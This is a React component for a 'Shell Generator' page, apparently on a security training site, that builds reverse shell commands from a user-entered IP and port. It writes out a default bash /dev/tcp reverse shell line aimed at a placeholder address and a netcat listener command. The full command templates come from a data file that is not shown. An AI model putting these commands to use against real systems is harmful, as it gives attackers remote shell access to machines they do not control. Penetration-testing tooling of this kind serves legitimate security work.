import React, { useState, useEffect } from "react";
import { Wrapper } from "../../Dashboard/Profile/ProfileElements";
import {
    Input,
    Dropdown,
    ReverseShellHeader,
    ShellList,
    ReverseShellContainer,
    IpAndPortSubContainer2,
    RevShellHeaderTop,
    RevShellHeaderMiddle,
    RevShellHeaderSubContainer,
    RevShellBodyTop,
    RevShellBodyBottom,
    OsSearchContainer,
    DownloadSection,
    PortNumberIncAndDec,

    RevShellBodyContainer,
    ShellDisplayContainer,
    KeyContainer,
    CommandDisplayContainer,
    CommandTitle,
} from "./ReveseShellElement";
import { BsClipboardFill } from "react-icons/bs";
import { InternshipHeader, InternshipHeading } from "../../Opportunities/Internship/InternshipElements";
import { FaDownload, FaMinus, FaPlus } from "react-icons/fa";
import CodeSyntaxHighlighter from "../../Common/CodeSyntaxHighlighter";
import { reverseShellCommands } from "./shellData";

function ReverseShellGenerator() {
    const [useIp, setIp] = useState("10.10.10.10");
    const [port, setPort] = useState(1337);
    const [currentCommand, setCommand] = useState(`sh -i >& /dev/tcp/${useIp}/${port} 0>&1`);
    const [selected, setSelected] = useState("Bash -i");
    const [Os, setOS] = useState(reverseShellCommands.map((command) => command.name));

    useEffect(() => {
        const selectedCommand = reverseShellCommands.find((command) => command.name === selected);
        const commandTemplate = selectedCommand.template;
        const replacedCommand = commandTemplate.replace(/{useIp}/g, useIp).replace(/{port}/g, port);
        setCommand(replacedCommand);
    }, [useIp, port, selected]);

    function ChangeOnOS() {
        const currentOS = document.getElementById("OS-select").value;
        if (currentOS === "all") {
            setOS(reverseShellCommands.map((command) => command.name));
        } else {
            const filterOS = reverseShellCommands
                .filter((command) => command.meta.includes(currentOS))
                .map((command) => command.name);
            setOS(filterOS);
        }
    }

    function chainingPort() {
        setPort(document.getElementById("ports").value);

        if (document.getElementById("ports").value === "") {
            setPort(0);
        }
    }

    const [searchInput, setSearchInput] = useState("");

    const handleSearchChange = (event) => {
        setSearchInput(event.target.value);
    };

    const filteredOs = Os.filter((key) => key.toLowerCase().includes(searchInput.toLowerCase()));

    useEffect(() => {
        setCommand(reverseShellCommands.find((command) => command.name === selected).template);
    }, [useIp, port]);

    function ipChange() {
        setIp(document.getElementById("IP").value);
    }

    function SetCurrent(key) {
        const element = document.querySelectorAll(".Key");
        element.forEach((element) => {
            if (element.id === key) {
                element.style.backgroundColor = "black";
            } else {
                element.style.backgroundColor = "";
            }
        });
        setSelected(key);

        const selectedCommand = reverseShellCommands.find((command) => command.name === key);
        const commandTemplate = selectedCommand.template;
        const replacedCommand = commandTemplate.replace(/{useIp}/g, useIp).replace(/{port}/g, port);
        setCommand(replacedCommand);
    }

    function copyToClipboard(text) {
        if (navigator?.clipboard?.writeText) {
            navigator.clipboard.writeText(text);
            document.getElementById("clipboard-toast").style.display = "block";
        } else if (window?.clipboardData?.setData) {
            window.clipboardData.setData("Text", text);
            document.getElementById("clipboard-toast").style.display = "block";
        } else {
            document.getElementById("clipboard-failure-toast").style.display = "block";
        }
    }

    // Function to handle port increment
    const incrementPort = () => {
        setPort((prevPort) => prevPort + 1);
    };

    // Function to handle port decrement
    const decrementPort = () => {
        if (port > 0) {
            setPort((prevPort) => prevPort - 1);
        }
    };

    return (
        <Wrapper>
            <div style={{ display: "flex", flexDirection: "column", gap: "25px" }}>
                <InternshipHeader style={{ background: "#0c0c0c" }}>
                    <InternshipHeading
                        style={{
                            fontSize: "3rem",
                            fontStyle: "normal",
                            fontWeight: "bold",
                            fontFamily: "'Fira Code', monospace",
                        }}
                    >
                        Shell Generator
                    </InternshipHeading>
                </InternshipHeader>

                <ReverseShellContainer>
                    <ReverseShellHeader>
                        <RevShellHeaderSubContainer>
                            <RevShellHeaderTop> IP & Port </RevShellHeaderTop>
                            <RevShellHeaderMiddle>
                                <IpAndPortSubContainer2>
                                    <label> IP </label>
                                    <Input id="IP" value={useIp} onChange={ipChange} />
                                </IpAndPortSubContainer2>
                                <IpAndPortSubContainer2>
                                    <label> Port </label>
                                    <Input id="ports" defaultValue={"1337"} value={port} onChange={chainingPort} />
                                    <PortNumberIncAndDec>
                                        <FaPlus size={12} onClick={incrementPort} />
                                        <FaMinus size={12} onClick={decrementPort} />
                                    </PortNumberIncAndDec>
                                </IpAndPortSubContainer2>
                            </RevShellHeaderMiddle>
                        </RevShellHeaderSubContainer>

                        <RevShellHeaderSubContainer>
                            <RevShellHeaderTop> Listener </RevShellHeaderTop>
                            <RevShellHeaderMiddle>
                                <label id="rv"> nc -lvnp {port} </label>
                                <BsClipboardFill
                                    onClick={() => {
                                        copyToClipboard(document.getElementById("rv").innerText);
                                    }}
                                />
                            </RevShellHeaderMiddle>
                        </RevShellHeaderSubContainer>
                    </ReverseShellHeader>

                    <RevShellBodyContainer>
                        <RevShellBodyTop>
                            <OsSearchContainer>
                                <label>OS</label>
                                <Dropdown id="OS-select" onChange={ChangeOnOS}>
                                    <option value="all">ALL</option>
                                    <option value="windows">Window</option>
                                    <option value="linux">Linux</option>
                                    <option value="mac">Mac</option>
                                </Dropdown>
                            </OsSearchContainer>
                            <OsSearchContainer>
                                <label>Search</label>
                                <Input
                                    type="text"
                                    placeholder="Search..."
                                    value={searchInput}
                                    onChange={handleSearchChange}
                                />
                            </OsSearchContainer>
                            <OsSearchContainer>
                                <label> Download </label>
                                <DownloadSection>
                                    <FaDownload />
                                </DownloadSection>
                            </OsSearchContainer>
                        </RevShellBodyTop>

                        <RevShellBodyBottom>
                            <ShellDisplayContainer>
                                <ShellList id="shell-display">
                                    {filteredOs.map((key) => (
                                        <KeyContainer
                                            key={key}
                                            id={key}
                                            className="Key"
                                            onClick={() => {
                                                SetCurrent(key);
                                            }}
                                        >
                                            {key}
                                        </KeyContainer>
                                    ))}
                                </ShellList>
                            </ShellDisplayContainer>
                            <CommandDisplayContainer>
                                <CommandTitle>
                                    <CodeSyntaxHighlighter
                                        code={currentCommand.replace(/{useIp}/g, useIp).replace(/{port}/g, port)}
                                    />
                                </CommandTitle>
                            </CommandDisplayContainer>
                        </RevShellBodyBottom>
                    </RevShellBodyContainer>
                </ReverseShellContainer>
            </div>
        </Wrapper>
    );
}

export default ReverseShellGenerator;
